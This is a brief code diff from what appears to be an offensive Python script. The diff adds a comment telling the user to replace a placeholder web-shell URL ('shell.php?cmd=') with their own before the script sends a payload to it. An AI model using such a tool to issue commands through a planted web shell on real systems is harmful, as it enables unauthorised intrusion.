@@ -52,7 +52,7 @@ def main():
 
 	filename 	 = fname
 	data	 	 = read_file(filename)
-	shell_url 	 = 'http://target.com/shell.php?cmd='
+	shell_url 	 = 'http://target.com/shell.php?cmd=' #change this to your shell url
 	send_payload(shell_url, data, output)
 
 
